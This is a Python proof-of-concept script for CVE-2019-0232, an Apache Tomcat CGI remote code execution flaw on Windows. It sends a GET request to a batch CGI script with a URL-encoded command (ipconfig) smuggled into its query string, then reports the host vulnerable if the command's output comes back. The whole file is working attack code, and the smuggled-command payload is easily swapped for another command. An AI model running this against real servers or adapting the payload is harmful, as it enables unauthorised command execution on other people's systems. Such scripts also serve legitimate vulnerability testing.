#!/usr/bin/env python3
#@author: badger
#@date: 2019-10-20
#
import requests
import time
import sys

class PoC(object):
    name = "Apache Tomcat Remote Code Execute"
    appName = "Apache Tomcat"
    appMaun = "Apache Software Foundation"
    appVersion = "9.0.0 M1 - 9.0.17, 8.5.0 - 8.5.39, 7.0.0 - 7.0.39"
    updateDate = "2019-10-20"
    Plateform = "Windows"
    vulRefer = "CVE-2019-0232"

    def __init__(self, host, port):
        self.host = str(host)
        self.port = str(port)

    def _check(self):

        isVul = False
        check_url = "{}:{}/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cipconfig".format(self.host, self.port)
        try:
            res = requests.get(url="https://"+check_url)
        except Exception as e:
            try:
                res = requests.get(url="http://"+check_url)
            except Exception as e:
                print("Something went wrong.\nUsage: python CVE-2019-0232.py <host> <port>")
            finally:
                # print(res.text)
                if "Windows IP" in res.text:
                    isVul = True
        finally:
            if "Windows IP" in res.text:
                isVul = True
        if isVul:
            print("The target is vulnerable to {}.".format(self.vulRefer))
        else:
            print("The target seems not vulnerable to {}.".format(self.vulRefer))

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
    except:
        print("Something went wrong.\nUsage: python CVE-2019-0232.py <host> <port>")
        exit(-1)
    poc = PoC(host, port)
    poc._check()
